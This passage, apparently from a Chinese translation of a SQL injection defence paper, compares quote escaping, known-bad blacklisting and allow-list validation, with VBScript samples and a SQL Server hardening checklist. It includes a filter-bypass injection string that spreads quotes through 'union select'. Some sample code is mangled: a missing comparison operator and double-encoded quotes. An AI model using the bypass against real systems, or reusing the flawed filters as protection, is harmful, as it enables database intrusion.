2） 拒绝被认为是错误的输入

3） 只接收被认为是正确的输入

第一种情况有一些概念上的问题；首先，开发人员没必要知道那些是错误数据，因为新的错误数据的形式始终被发现。其次，修改数据会引起上面描述过的数据的长度问题。最后，二次使用的问题包括系统中已经存在数据的重新使用。

第二种情况也存在第一种情况中的问题；已知的错误输入随着攻击技术的发展变化。

第三种情况可能是三种中最好的，但是很难实现。

从安全角度看合并第二种方法和第三种方法可能是最好的方法--只允许正确的输入，然后搜索输入中已知的错误数据。

带有连接符号的姓名的问题对于体现合并两种方法的必要性是一个好的例子：

Quentin Bassington-Bassington

我们必须在正确输入中允许连接符号，但是我们也意识到字符序列&amp;apos;-&amp;apos;对SQL SERVER很重要。

当合并修改数据和字符序列确认时，会出现另一个问题。例如，如果我们应用一个错误过滤在除去单引号之后去探测&amp;apos;-&amp;apos;，&amp;apos;select&amp;apos;和&amp;apos;union&amp;apos;，攻击者可以输入：

uni&amp;apos;on sel&amp;apos;ect @@version-&amp;apos;-

既然单引号被除去，攻击者可以简单地散布单引号在自己的错误的字符串中躲避被发现。

这有一些确认代码的例子：

方法一--过滤单引号

function escape(input)

input=replace(input,&quot;&amp;apos;&quot;,&quot;&amp;apos;&amp;apos;&quot;)

escape=input

end function

方法二--拒绝已知的错误输入

function validate_string(input)

known_bad=array(&quot;select&quot;,&quot;insert&quot;,&quot;update&quot;,&quot;delete&quot;,&quot;drop&quot;,&quot;-&quot;,&quot;&amp;apos;&quot;)

validate_string=true

for i=lbound(known_bad) to ubound(known_bad)

if(instr(1,input,known_bad(i),vbtextcompare)0) then

validate_string=false

exit function

end if

next

end function

方法三--只允许正确的输入

function validatepassword(input)

good_password_chars=&quot; abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;

validatepassword=true

for i=1 to len(input)

c=mid(input,I,1)

if(InStr(good_password_chars,c)=0) then

validatepassword=false

exit function

end if

next

end function

[SQL SERVER锁定]

在这指出的重要一点是锁定SQL SERVER是必要的；外面的是不安全的。这是一个但创建SQL SERVER时需要做的事情的简短的列表：

1.确定连接服务器的方法

a.确定你所使用的网络库是可用的，那么使用&quot;Network Utility&quot;

2.确定哪些帐户是存在的

a.为应用程序的使用创建一个低权限的帐户

b.删除不必要的帐户

c.确定所有帐户有强壮的密码；执行密码审计

3.确定哪些对象存在

a.许多扩展存储过程能被安全地移除。如果这样做了，应该移除包含在扩展存储过程代码中的&amp;apos;.dll&amp;apos;文件

b.移除所有示例数据库--例如&amp;apos;northwind&amp;apos;和&amp;apos;pubs&amp;apos;数据库

4.确定哪写帐户能过使用哪些对象

a.应用程序进入数据库所使用的帐户应该有保证能够使用它需要的对象的最小权限

5.确定服务器的补丁

a.针对SQL SERVER有一些缓冲区溢出和格式化字符串攻击，也有一些其他的安全补丁发布。应该存在很多。

6.确定什么应该被日志记录，什么应该在日志中结束。

[参考文献]

[1] Web Application Disassembly with ODBC Error Messages, David Litchfield

[http://www.nextgenss.com/papers/webappdis.doc](http://www.nextgenss.com/papers/webappdis.doc)

[2] SQL Server Security Checklist

[http://www.sqlsecurity.com/checklist.asp](http://www.sqlsecurity.com/checklist.asp)

[3] SQL Server 2000 Extended Stored Procedure Vulnerability

[http://www.atstake.com/research/adv...0/a120100-2.txt](http://www.atstake.com/research/adv...0/a120100-2.txt)

[4] Microsoft SQL Server Extended Stored Procedure Vulnerability

[http://www.atstake.com/research/adv...0/a120100-1.txt](http://www.atstake.com/research/adv...0/a120100-1.txt)

[5] Multiple Buffer Format String Vulnerabilities In SQL Server

[http://www.microsoft.com/technet/se...in/MS01-060.asp](http://www.microsoft.com/technet/se...in/MS01-060.asp)

[http://www.atstake.com/research/adv...1/a122001-1.txt](http://www.atstake.com/research/adv...1/a122001-1.txt)